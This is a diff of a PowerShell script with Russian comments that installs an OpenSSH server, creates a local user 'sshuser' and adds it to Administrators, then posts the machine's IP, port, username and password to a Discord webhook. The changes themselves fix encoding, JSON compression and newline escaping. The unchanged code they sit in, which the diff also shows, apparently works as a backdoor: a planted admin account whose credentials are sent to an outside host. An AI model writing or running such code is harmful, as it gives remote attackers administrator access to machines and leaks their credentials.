@@ -1,4 +1,8 @@
 try {
+    # Принудительно устанавливаем кодировку консоли и процессов
+    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+    $PSDefaultParameterValues['ConvertTo-Json:Depth'] = 10
+
     $StopWatch = [system.diagnostics.stopwatch]::startNew()
 
     # URL вебхука Discord
@@ -10,7 +14,8 @@ try {
             content = $MessageContent
         }
         try {
-            Invoke-RestMethod -Uri $WebhookURL -Method Post -Body (ConvertTo-Json $Message -Depth 10) -ContentType 'application/json'
+            $JsonBody = $Message | ConvertTo-Json -Depth 10 -Compress
+            Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $JsonBody -ContentType 'application/json'
         } catch {
             Write-Host "Не удалось отправить сообщение в Discord: $($Error[0])" -ForegroundColor Red
         }
@@ -49,7 +54,7 @@ try {
         $Username = "sshuser"
         net user $Username $Password /add
         net localgroup administrators $Username /add
-        Send-DiscordMessage "👤 Создан пользователь: `$Username."
+        Send-DiscordMessage "👤 Создан пользователь: $Username."
     }
 
     # Получаем основной IP-адрес
@@ -66,7 +71,7 @@ try {
 
     # Итоговое сообщение
     [int]$Elapsed = $StopWatch.Elapsed.TotalSeconds
-    Send-DiscordMessage "✅ OpenSSH Server успешно установлен за $Elapsed секунд!\nIP: $IPAddress\nPort: $Port\nUser: $Username\nPassword: $Password"
+    Send-DiscordMessage "✅ OpenSSH Server успешно установлен за $Elapsed секунд!`nIP: $IPAddress`nPort: $Port`nUser: $Username`nPassword: $Password"
 
 } catch {
     $ErrorMessage = "⚠️ Ошибка в строке $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
